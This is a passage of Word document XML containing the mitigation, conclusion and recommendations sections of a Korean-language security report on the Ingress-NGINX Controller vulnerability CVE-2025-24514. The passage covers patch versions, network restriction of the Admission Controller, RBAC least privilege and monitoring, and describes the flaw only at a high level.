          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>즉각적 패치 및 네트워크 차단</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>클라우드 사업자(AWS, GCP 등)는 취약점 공개 즉시 보안 권고를 발행하고, 고객에게 Ingress-NGINX Controller의 최신 버전(1.11.5, 1.12.1)으로 업그레이드할 것을 강력히 권고했습니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>동시에, Admission Controller Pod에 대한 네트워크 접근을 내부로 제한하는 네트워크 정책 적용이 단기 완화책으로 제시되었습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288369EE" w14:textId="60A4E639" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안 모니터링 강화</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">클라우드 보안팀은 Kubernetes Audit Log, Ingress Controller 로그, 네트워크 IDS/IPS를 연동해 비정상적인 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>AdmissionReview</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 요청, NGINX 설정 오류, Secrets 접근 이벤트 등을 실시간으로 모니터링했습니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54838F99" w14:textId="304F5601" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>RBAC 최소 권한 원칙 적용</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>Ingress-NGINX Controller의 서비스 계정 권한을 최소화하고, Secrets 접근 범위를 제한하는 RBAC 정책을 재점검했습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5628CD01" w14:textId="04BEE01B" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller 설정 강화</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>Admission Controller의 인증 및 네트워크 제한, annotation validation 활성화, 불필요한 webhook 비활성화 등 보안 옵션을 적극 적용했습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764D72D5" w14:textId="0DA0E6FD" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시사점</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143B3C8F" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터 내 핵심 컴포넌트(Admission Controller 등)는 반드시 네트워크 경계 내에서만 접근 가능하도록 설계해야 하며, 인증 없는 외부 노출은 치명적 결과를 초래할 수 있습니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1631F302" w14:textId="13845B88" w:rsidR="00BA5E73" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="00BA5E73">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubernetes 보안은 단일 취약점이 아닌, 권한 구조·네트워크 구조·운영 정책 등 다층 방어가 필수적입니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEC21DE" w14:textId="77777777" w:rsidR="00E27F85" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DC3CAF" w14:textId="041E69A5" w:rsidR="00E27F85" w:rsidRPr="00BA5E73" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA5E73">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">10. </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>결론</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650FC8AD" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRDefault="0006542A" w:rsidP="0006542A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006542A">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">10.1 </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점의</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>심각성</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>요약</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355CBCE8" w14:textId="19887081" w:rsidR="0006542A" w:rsidRPr="0006542A" w:rsidRDefault="009E3DDA" w:rsidP="0006542A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514는 Ingress-NGINX Controller에서 발견된 치명적인 인증 없는 원격 코드 실행(RCE) 취약점으로, 공격자가 단순히 악의적인 Ingress 리소스를 생성하는 것만으로도 클러스터 내 모든 Secrets에 접근하고, 궁극적으로 전체 Kubernetes 클러스터를 장악할 수 있는 심각한 위협입니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">이 취약점은 기본적으로 Ingress-NGINX Controller가 광범위한 권한(Secrets 접근 등)을 가지고 있고, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 검증이 미흡한 상태에서 NGINX 설정 파일에 annotation 값을 직접 삽입하는 구조적 문제에서 비롯됩니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>실제 공격이 보고되고 있으며, 약 6,500개 이상의 클러스터가 인터넷에 노출된 상태로 확인되어, 전 세계 클라우드 환경의 약 43%가 영향권에 있는 것으로 분석됩니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>CVSS v3.1 기준 8.8점(High)~9.8점(Critical)으로 평가되며, PoC 및 실제 공격 시도가 확인된 만큼 즉각적이고 전사적인 대응이 요구됩니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C7E8B2" w14:textId="3537A91F" w:rsidR="0006542A" w:rsidRDefault="0006542A" w:rsidP="0006542A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006542A">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">10.2 </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>운영자</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개발자를</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위한</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권고</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA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E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사항</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DDE63D" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>즉각적인 패치 적용</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D690A6" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller를 반드시 v1.11.5, v1.12.1 이상으로 업그레이드해야 합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5977E5A7" w14:textId="510859DA" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치 전까지는 Admission Controller의 네트워크 접근을 내부로 제한하거나, 임시로 Admission Controller를 비활성화하는 조치가 필요합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B21E18" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약 클러스터 식별 및 노출 범위 점검</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3739642C" w14:textId="5E7F97DB" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모든 클러스터에서 Ingress-NGINX Controller의 버전 및 네트워크 노출 상태를 점검하고, 외부에서 Admission Controller에 접근 가능한 환경이 없는지 확인해야 합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC4C394" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>RBAC 및 권한 최소화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8FC535" w14:textId="703E92E8" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Ingress-NGINX Controller가 불필요하게 클러스터 전체의 Secrets에 접근하지 않도록 서비스 계정 권한을 최소화하고, RBAC 정책을 재점검해야 합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688D3DD2" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안 모니터링 및 탐지 체계 강화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D898AA4" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
